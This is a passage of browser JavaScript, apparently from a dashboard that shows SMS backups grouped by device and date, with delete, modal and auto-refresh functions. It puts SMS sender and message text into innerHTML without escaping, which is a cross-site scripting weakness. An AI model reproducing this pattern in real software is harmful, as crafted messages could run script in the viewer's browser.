    Object.keys(groupedMessages).forEach(dateLabel => {
        html += `
            <tr class="bg-purple-900 bg-opacity-30">
                <td colspan="3" class="px-2 py-2 text-xs font-bold text-purple-300">
                    <i class="fas fa-calendar-day mr-1"></i>${dateLabel}
                </td>
            </tr>
        `;
        groupedMessages[dateLabel].forEach(msg => {
            html += `
                <tr class="hover:bg-gray-800">
                    <td class="px-2 py-1 text-xs">${msg.sender || 'Unknown'}</td>
                    <td class="px-2 py-1 text-xs" style="white-space: pre-wrap; word-break: break-word; max-width: 300px;">${msg.message || ''}</td>
                    <td class="px-2 py-1 text-xs text-gray-400">${msg.dateTime || ''}</td>
                </tr>
            `;
        });
    });
    
    tbody.innerHTML = html;
    document.getElementById('backup-device-name').textContent = backup.deviceName;
    document.getElementById('backup-message-count').textContent = `${backup.messageCount} messages`;
    document.getElementById('backup-view-modal').style.display = 'block';
}

function deleteBackup(deviceId) {
    if (!confirm('Delete this backup?')) return;
    delete smsBackups[deviceId];
    localStorage.setItem('sms_backups', JSON.stringify(smsBackups));
    const searchTerm = document.getElementById('backup-search').value;
    renderBackupTable(searchTerm);
    alert('✅ Backup deleted');
}

function closeBackupModal() {
    document.getElementById('backup-modal').style.display = 'none';
    document.getElementById('backup-search').value = '';
}

function closeBackupViewModal() {
    document.getElementById('backup-view-modal').style.display = 'none';
}

// Close modals on outside click
window.onclick = function(event) {
    if (event.target.classList.contains('modal')) {
        event.target.style.display = 'none';
    }
}

// Auto load
window.addEventListener('DOMContentLoaded', () => {
    loadDevices();
    setInterval(() => loadDevices(), 30000);
});
